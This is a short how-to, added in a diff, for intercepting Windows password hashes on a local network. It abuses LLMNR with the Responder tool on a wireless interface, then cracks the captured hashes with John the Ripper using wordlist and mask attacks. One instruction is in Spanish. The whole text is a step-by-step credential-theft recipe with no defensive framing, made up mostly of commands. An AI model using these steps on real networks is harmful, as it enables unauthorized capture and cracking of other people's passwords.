@@ -1,0 +1,28 @@
+HOw to intercept and decrypt windows passwords on local network
+_______________________________________________________________
+
+1) INTRO
+
+While communicating with other devices on a local network, Windows will use the Link-Local Multicast Name Resolution (LLMNR) protocol to perform hostname resolutions for devices on the local network. Any legitimate client on the local network can interact with the LLMNR protocol to assist Windows in resolving the hostname of another device on the network.
+
+2)STEPS
+
+1-
+	>>apt-get update
+	>>apt-get install responder
+
+2.- Basic usage
+
+    >> responder -I wlan0
+
+    --> Copiar y pegar el hash cuando se encuentre en un txt
+
+3.- John the Ripper
+
+    >> john -wordlist:words.txt hash.txt
+
+    >> john -mask=?l?l?l?l?l hash.txt
+    >> john -mask=?u?l?l?l?l?l?d?d -min-len=6 hash.txt
+
+Different ways to use it and to bruteforce
+
